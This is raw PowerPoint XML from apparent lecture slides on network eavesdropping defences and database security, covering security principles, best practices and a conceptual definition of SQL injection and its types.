              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Enforce HTTPS (TLS/SSL): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Mandate encryption for all web traffic. Install valid certificates on servers and use HTTP Strict Transport Security (HSTS) .</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Use a VPN: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Encrypt all network traffic from a device by routing it through a secure tunnel to a trusted server, especially on public Wi-Fi.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Deploy Intrusion Detection/Prevention Systems (IDS/IPS):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Use tools to monitor network traffic for patterns and signatures of active attacks like ARP spoofing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>ARP Spoofing Detection:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Use tools to monitor for gratuitous or duplicate ARP replies, which are hallmarks of an active eavesdropping attempt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>User Training &amp; Policies:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> Educate users to avoid public Wi-Fi for sensitive tasks, recognize secure connections (HTTPS), and use approved encrypted tools.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="389886616"/>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4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2D4AEA93-B45D-C658-A60F-6ED845F9FE86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="354806" y="1443038"/>
            <a:ext cx="8434387" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Unit 4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="4000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Database Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1466183401"/>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B3987-1717-BA1A-8A2D-43962A8183DE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Introduction to Databases</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{576119B2-5FB2-5436-71EE-F75323D65509}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="621677" y="800806"/>
            <a:ext cx="7704000" cy="4100573"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Albert Sans"/>
              </a:rPr>
              <a:t>A database is an organized collection of structured information, or data, typically stored electronically in a computer system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Types of Databases</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Relational Databases (RDBMS):</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Store data in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>tables</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (rows &amp; columns).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>SQL (Structured Query Language)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to manage data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Examples: MySQL, PostgreSQL, Oracle, SQL Server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>NoSQL Databases:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Store unstructured or semi-structured data (documents, key-value pairs).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Flexible, often used in big data and cloud apps.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Examples: MongoDB, Cassandra, Redis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Why Databases Need Security: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Databases store </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>critical and sensitive data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (passwords, payment details, medical info).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>If compromised, it can lead to: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Data breaches,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Financial loss, Reputation damage, Legal penalties.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:br>
              <a:rPr lang="en-IN" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="310068067"/>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9CCBC-B552-B781-256E-44C47F8913F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Database Security </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{563CFFC0-482D-57A7-304A-BE7589727B1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Database Security</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> means protecting a database from:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Confidentiality breaches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → unauthorized people seeing data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Integrity breaches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → unauthorized changes to data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>Availability issues</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → preventing access to data (e.g., through attacks or failures).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Common Database Security Threats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Unauthorized Access</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – weak passwords or misconfigured permissions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – attackers manipulate queries to steal/change data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Privilege Abuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – insiders misusing their access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Data Leakage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – unprotected backups or logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Denial of Service (DoS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – making the database unavailable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Malware/Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – encrypting or destroying database files.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Poor Configuration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> – default accounts, unnecessary open ports.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3659702837"/>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B9BC1-965E-B1E7-52DB-3448CDA550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D318F9-DE57-60D5-7108-3637272DE096}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Principles of Database Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB17961D-33D9-EEC8-A3F4-30013F76AA21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825388"/>
            <a:ext cx="7704000" cy="4171440"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Core Principles of Database Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Authentication:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Verify who the user is (username, password, MFA).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Authorization:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Define what the user is allowed to do (read, update, delete).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Encryption:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Protect data at rest (in storage) and in transit (over network).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Auditing &amp; Logging:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Track who accessed what and when.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Backup &amp; Recovery:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ensure data can be restored after attacks or failures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Best Practices for Database Security</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>strong, unique passwords</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and avoid default accounts. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Keep the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>database server patched and updated</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Encrypt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>data at rest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>data in transit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (TLS/SSL).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>firewalls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and restrict database access to trusted networks only.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Regularly </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>backup data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and test recovery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>auditing and monitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for suspicious activity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>input validation &amp; parameterized queries</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to prevent SQL Injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="147673374"/>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DC8FA-B8D5-C709-658D-2BB64716A732}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{573FAC92-3F3E-C721-CD47-BA087B99756F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="720000" y="825388"/>
            <a:ext cx="7704000" cy="4171440"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection (SQLi) is an attack where an attacker injects malicious SQL code into an application’s input so the database executes unintended commands.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It happens when untrusted user input is concatenated directly into SQL queries instead of being treated as data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Types of SQL Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In-Band SQL Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Blind SQLi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Out-of-band SQL injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2574950507"/>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45383-13DE-EA37-0229-33A54F956CEF}"/>
              </a:ext>
            </a:extLst>
